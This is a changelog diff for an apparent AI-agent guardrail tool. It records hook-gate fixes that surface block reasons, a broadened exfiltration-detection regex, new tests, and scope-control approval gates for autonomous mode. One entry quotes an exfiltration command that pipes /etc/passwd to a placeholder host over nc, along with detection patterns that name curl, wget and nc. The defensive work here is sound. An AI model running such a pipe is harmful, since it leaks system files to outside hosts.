@@ -5,6 +5,88 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [0.63.2] - 2026-05-08
+
+### Fixed
+
+- **PreToolUse gate block messages now reach the user.** `_gate_bash`,
+  `_gate_spawn`, and `_gate_state_sanitize` in `hooks/spellbook_hook.py`
+  exited with code 2 (block) but printed the error JSON to stdout, so
+  Claude Code surfaced every blocked command as
+  `PreToolUse:Bash hook error: [...]: No stderr output` with no
+  actionable reason. Routed the JSON to `sys.stderr` (matching
+  `_emit_block_and_exit`'s existing pattern) so the harness can show
+  the operator why a command was blocked. Same fix applied to the
+  standalone `spellbook/gates/check.py` CLI used by the opencode
+  plugin and gemini policy entry points. Affected tests in
+  `tests/test_security/test_hooks.py` and
+  `tests/test_security/test_hooks_windows.py` now read `proc.stderr`
+  for gate-error JSON assertions.
+
+### Changed
+
+- **Bash gate no longer denies all compound commands.** The L4 bashlex
+  parser previously emitted a CRITICAL `BASH-PARSER-COMPOUND` finding
+  for every `|`, `&&`, `||`, and `;`, blocking routine pipelines like
+  `ls | head` and `wc -l file && ls`. The blanket deny was redundant:
+  the L4 walker already recurses into compound children and applies
+  per-command classifiers (env-prefix, shellout, wrapper, redirect,
+  direct-shell, cmdsub) to each segment, and the L2 substring-anywhere
+  regex (`DANGEROUS_BASH_PATTERNS`, `EXFILTRATION_RULES`) catches
+  dangerous payloads anywhere in the full command string.
+  `_classify_compound` now returns `[]`, and the if/for/while/until/case
+  control-flow branch no longer emits COMPOUND either; the walker still
+  recurses so nested CMDSUB/DIRECT-SHELL/etc. continue to surface.
+- **EXF-007 broadened to plug a pipe-to-network-tool exfiltration gap.**
+  The previous regex `echo\s+.*\|\s*(curl|wget|nc)` restricted the LHS
+  of the pipe to `echo`, leaving `cat /etc/passwd | nc HOST PORT`
+  uncovered. Broadened to `\|\s*(curl|wget|nc)\s+\S+` and updated the
+  rule message to "Piped exfiltration into network tool". Rule id
+  preserved.
+- **Gate test coverage reorganized around per-segment evaluation.**
+  Removed the obsolete BASH-PARSER-COMPOUND reject rows in
+  `tests/gates/test_bash_parser.py`, added `BENIGN_COMPOUND_CASES`
+  (5 allow rows), and added `COMPOUND_WITH_DANGEROUS_PAYLOAD`
+  (6 full-stack reject rows; rule-id-agnostic — asserts `safe is False`
+  with at least one CRITICAL/HIGH finding so future layer reshuffles
+  don't break the test). `test_check.py::test_tier_layer_runs_after_bashlex`
+  retargeted at `TIER-*` since the prior `BASH-PARSER-*` assertion no
+  longer fires; "layers compose" intent preserved.
+
+## [0.63.1] - 2026-05-07
+
+### Added
+
+- **Scope-explosion guardrails for the `develop` skill family.** Five surgical,
+  additive guardrails to prevent the failure mode where a "minor change"
+  balloons into an over-engineered design with parallel chunk sessions
+  fanning out before the operator can catch the divergence:
+  - `commands/feature-design.md` Phase 2.0 — Primary Source Re-Anchor:
+    operator must explicitly name the canonical source (URL/file/JIRA/
+    Confluence) before design synthesis; the design subagent prompt
+    re-fetches it so design doesn't drift onto upstream derivatives.
+  - `skills/devils-advocate/SKILL.md` + `commands/feature-discover.md`
+    Phase 1.6 — Finding Disposition Framework: every devils-advocate
+    finding now carries a `disposition` field
+    (`address` / `note_only` / `out_of_scope`) with `note_only` as the
+    default. Phase 1.6 assigns dispositions per-finding before any
+    meta-action; `address` is never assigned silently in autonomous
+    mode for findings that expand scope.
+  - `AGENTS.spellbook.md` "Autonomous Mode and Scope Discipline"
+    (cross-referenced from `skills/develop/SKILL.md`): autonomous mode
+    scopes confirmations, not scope. New capabilities/infra/integrations
+    not in the operator's initial request require pause regardless of
+    autonomous mode.
+  - `commands/feature-design.md` Phase 2.5 — Scope Coherence Check:
+    a narrow subagent fed only the original Phase 0 request and the
+    design TOC + section openers answers "could this be 5 bullets
+    matching the original ask?"; `No`/`Unsure` halts Phase 2.
+  - `commands/feature-implement.md` Phase 3.4.7 — One-Pager Approval
+    Gate: no chunk-prompt generation, `forge_project_init`,
+    sub-orchestrator dispatch, or parallel session spawn until the
+    operator explicitly approves a 200-line-or-shorter plain-English
+    one-pager. Not waived by autonomous mode.
+
 ## [0.63.0] - 2026-05-07
 
 ### Added
